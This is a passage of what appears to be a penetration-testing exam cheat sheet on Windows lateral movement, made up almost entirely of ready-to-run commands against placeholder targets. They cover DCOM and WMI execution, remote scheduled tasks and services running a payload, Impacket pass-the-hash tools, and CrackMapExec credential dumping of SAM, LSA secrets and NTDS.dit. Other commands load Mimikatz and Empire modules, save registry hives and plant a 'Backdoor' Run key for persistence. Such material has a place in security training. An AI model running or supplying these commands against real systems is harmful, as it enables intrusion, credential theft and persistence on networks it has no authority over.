+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c"># MMC20.Application</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.Application&quot;</span><span class="p">,</span><span class="s2">&quot;TARGET&quot;</span><span class="p">))</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nv">$com</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,@(</span><span class="s2">&quot;/c&quot;</span><span class="p">,</span><span class="s2">&quot;calc.exe&quot;</span><span class="p">),</span><span class="s2">&quot;C:\Windows\System32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">)</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="c"># ShellWindows</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[Type]</span><span class="p">::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="s1">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span><span class="p">,</span><span class="s2">&quot;TARGET&quot;</span><span class="p">))</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="nv">$com</span><span class="p">.</span><span class="n">item</span><span class="p">().</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="s2">&quot;/c calc.exe&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Windows\System32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="c"># ShellBrowserWindow</span>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[Type]</span><span class="p">::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="s1">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span><span class="p">,</span><span class="s2">&quot;TARGET&quot;</span><span class="p">))</span>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="nv">$com</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="s2">&quot;/c calc.exe&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Windows\System32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<h3 id="using-schtasks">Using schtasks</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a># Create scheduled task
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>schtasks /create /tn &quot;TaskName&quot; /tr &quot;C:\payload.exe&quot; /sc once /st 00:00 /S TARGET /U DOMAIN\username /P password
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a># Execute immediately
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>schtasks /create /tn &quot;TaskName&quot; /tr &quot;cmd.exe /c whoami&quot; /sc once /st 00:00 /S TARGET /U DOMAIN\username /P password
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>schtasks /run /tn &quot;TaskName&quot; /S TARGET /U DOMAIN\username /P password
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a># Delete task
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>schtasks /delete /tn &quot;TaskName&quot; /S TARGET /U DOMAIN\username /P password /F
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a># List tasks
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>schtasks /query /S TARGET /U DOMAIN\username /P password
+</span></code></pre></div>
+<h3 id="using-impacket-atexec">Using Impacket AtExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># With password</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>impacket-atexec<span class="w"> </span>DOMAIN/username:password@TARGET<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>impacket-atexec<span class="w"> </span>CORP/Administrator:P@ssw0rd@192.168.1.100<span class="w"> </span><span class="s1">&#39;ipconfig&#39;</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1"># With hash</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>impacket-atexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>impacket-atexec<span class="w"> </span>-hashes<span class="w"> </span>:e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>CORP/admin@192.168.1.100<span class="w"> </span><span class="s1">&#39;net user&#39;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="windows-services">Windows Services</h2>
+<h3 id="using-scexe">Using sc.exe</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a># Create service
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>sc \\TARGET create ServiceName binPath= &quot;C:\payload.exe&quot; obj= &quot;DOMAIN\username&quot; password= &quot;password&quot;
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a># Start service
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>sc \\TARGET start ServiceName
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a># Stop service  
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>sc \\TARGET stop ServiceName
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a># Delete service
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>sc \\TARGET delete ServiceName
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a># Query service
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>sc \\TARGET query ServiceName
+</span></code></pre></div>
+<h3 id="using-powershell">Using PowerShell</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c"># Create credential</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;DOMAIN\username&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="c"># Create service remotely</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>    <span class="nb">New-Service</span> <span class="n">-Name</span> <span class="s2">&quot;ServiceName&quot;</span> <span class="n">-BinaryPathName</span> <span class="s2">&quot;C:\payload.exe&quot;</span> <span class="n">-StartupType</span> <span class="n">Automatic</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>    <span class="nb">Start-Service</span> <span class="n">-Name</span> <span class="s2">&quot;ServiceName&quot;</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="p">}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="crackmapexec-swiss-army-knife">CrackMapExec (Swiss Army Knife)</h2>
+<h3 id="basic-usage">Basic Usage</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Check access</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd&#39;</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="c1"># With hash</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="c1"># Network scan</span>
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="c1"># Check local admin</span>
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--local-auth
+</span></code></pre></div>
+<h3 id="command-execution">Command Execution</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Execute command</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;ipconfig /all&quot;</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="c1"># Execute PowerShell</span>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-X<span class="w"> </span><span class="s1">&#39;$env:COMPUTERNAME&#39;</span>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="c1"># Execute on multiple hosts</span>
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;hostname&quot;</span>
+</span></code></pre></div>
+<h3 id="credential-dumping">Credential Dumping</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Dump SAM</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--sam
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c1"># Dump LSA secrets</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--lsa
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="c1"># Dump NTDS.dit (DC only)</span>
+</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>DC<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--ntds
+</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>
+</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="c1"># Dump with VSS</span>
+</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>DC<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--ntds<span class="w"> </span>vss
+</span></code></pre></div>
+<h3 id="module-usage">Module Usage</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># List modules</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>-L
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1"># Use specific module</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-M<span class="w"> </span>MODULE_NAME
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="c1"># Mimikatz module</span>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-M<span class="w"> </span>mimikatz
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="c1"># Empire module</span>
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-M<span class="w"> </span>empire_exec<span class="w"> </span>-o<span class="w"> </span><span class="nv">LISTENER</span><span class="o">=</span>http
+</span></code></pre></div>
+<hr />
+<h2 id="remote-registry">Remote Registry</h2>
+<h3 id="using-regexe">Using reg.exe</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># Query remote registry
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>reg query \\TARGET\HKLM\Software /s
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a># Save registry hive
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>reg save \\TARGET\HKLM\SAM C:\temp\SAM
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>reg save \\TARGET\HKLM\SYSTEM C:\temp\SYSTEM
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a># Add registry key
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>reg add \\TARGET\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d &quot;C:\payload.exe&quot;
+</span></code></pre></div>
+<h3 id="using-powershell_1">Using PowerShell</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c"># Query remote registry</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\Software\Microsoft\Windows\CurrentVersion&#39;</span> <span class="p">}</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="c"># With credentials</span>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\Software&#39;</span> <span class="p">}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="lateral-movement-with-credentials">Lateral Movement with Credentials</h2>
+<h3 id="credential-formats">Credential Formats</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1"># Clear-text password</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>DOMAIN<span class="se">\u</span>sername:password
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="c1"># NTLM hash</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>DOMAIN<span class="se">\u</span>sername:NTLM_HASH
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="c1"># LM:NTLM format</span>
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>DOMAIN<span class="se">\u</span>sername:LM_HASH:NTLM_HASH
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="c1"># Kerberos ticket</span>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>.kirbi<span class="w"> </span>or<span class="w"> </span>.ccache<span class="w"> </span>file
+</span></code></pre></div>
+<h3 id="quick-lateral-movement">Quick Lateral Movement</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># 1. PsExec (loudest but most reliable)</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>impacket-psexec<span class="w"> </span>DOMAIN/user:pass@TARGET
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c1"># 2. WMIExec (stealthier, semi-interactive)</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/user:pass@TARGET
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c1"># 3. SMBExec (uses service, stealthy)</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>impacket-smbexec<span class="w"> </span>DOMAIN/user:pass@TARGET
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="c1"># 4. AtExec (scheduled task, one command)</span>
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>impacket-atexec<span class="w"> </span>DOMAIN/user:pass@TARGET<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>
+</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="c1"># 5. DcomExec (DCOM, stealthier)</span>
+</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>impacket-dcomexec<span class="w"> </span>DOMAIN/user:pass@TARGET
+</span></code></pre></div>
+<hr />
+<h2 id="exam-scenarios">Exam Scenarios</h2>
+<h3 id="scenario-1-you-have-password">Scenario 1: You Have Password</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Step 1: Verify credentials work</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># Step 2: Get shell (choose one)</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>impacket-psexec<span class="w"> </span>DOMAIN/username:password@TARGET
